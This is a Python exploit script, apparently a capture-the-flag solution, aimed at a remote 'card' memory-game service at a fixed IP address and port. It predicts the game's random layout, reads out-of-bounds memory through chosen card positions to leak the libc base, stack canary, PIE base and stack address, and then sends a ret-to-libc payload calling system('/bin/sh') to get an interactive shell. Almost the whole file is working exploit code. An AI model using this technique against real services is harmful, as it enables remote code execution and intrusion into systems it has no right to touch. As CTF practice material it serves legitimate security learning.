from yeonnic import *
import ctypes
import subprocess

LIBC = ctypes.cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6.2")


def execute_cmd(cmd):
    p = subprocess.Popen(cmd, shell=True, stdout = PIPE)
    return p.stdout.read()

elf=ELF("./card")


#p=process("./card", env={"LD_PRELOAD":"./libc.so.6"})
p=remote("110.10.147.17", 8888)

def get_position(num, size):
    y = num/size
    x = num % size

    return x, y

def sendposition(num, size):
    x, y = get_position(num, size)
    p.sendline("%d,%d" %(x,y))
    print p.recvuntil("= ")
    result = int(p.recvline().strip())
    print p.recv()

    return result
    

def get_rand(size):
    result = execute_cmd("./test %d" %(size)).strip()[:-1]
    result2 = result.replace(" ","").split(",")
    result =[]

    for i in result2:
        result.append(int(i,16))
    d = {}

    answer = []
    count = 0
    for z in range(1,(size*size/2)+2-3-4-4-3-1):
        if z == 256:
            continue
        for i in range(size):
            for j in range(size):
                x=j
                y=i
                if z == result[y*size+x]:
                    answer.append("%d,%d" %(x,y))

    print result
    return answer


def play_game(choice, size):
    p.sendline("1")
    print p.recv()
    p.sendline(str(choice))
    answer = get_rand(size)
    print p.recv()

    print len(answer)
    count =1 
    for i in answer:
        count += 1
        p.sendline(i)
        time.sleep(0.01)
        print count
        p.recv()

gdb_pie_attach(p,[0xe11] ,"tracemalloc on\n")

p.sendline("771")

time.sleep(0.5)

play_game(77777, 0x18)

libc.address = 0
for i in range(3):
    a = sendposition(0x284+0x11+i, 0x18)
    libc.address += a << (8+8*i)
    sendposition(0x284+0x71+i, 0x18)

libc.address -= 0x1b0000

canary = 0
for i in range(3):
    a = sendposition(0x28d+i, 0x18)
    canary += a << (8+8*i)
    sendposition(0x2bd+i, 0x18)

pie_base = -0x2f98
for i in range(4):
    a = sendposition(0x2c4+i, 0x18)
    pie_base += a << (i*8)
    a = sendposition(0x290+i, 0x18)

stack = -0x394
for i in range(4):
    a = sendposition(0x284+0x50+i, 0x18)
    stack += a << (i*8)
    print sendposition(0x284+0x80+i, 0x18)

print 'canary ->', hex(canary)
print 'pie_base ->', hex(pie_base)
print 'stack ->', hex(stack)
print 'libc_base ->', hex(libc.address)
length = (pie_base + 0x3024 + (0x100000000-stack))& 0xffffffff
print sendposition(length, 0x18)
print sendposition(0x414, 0x18)

p.sendline("/bin/sh\x00")
p.sendline(("/bin/sh;"*0x20).ljust(0x1f4, "\x00")+flat(canary, 0, 0, 0, libc.symbols['system'], 0, stack - 0x26c))


p.interactive()
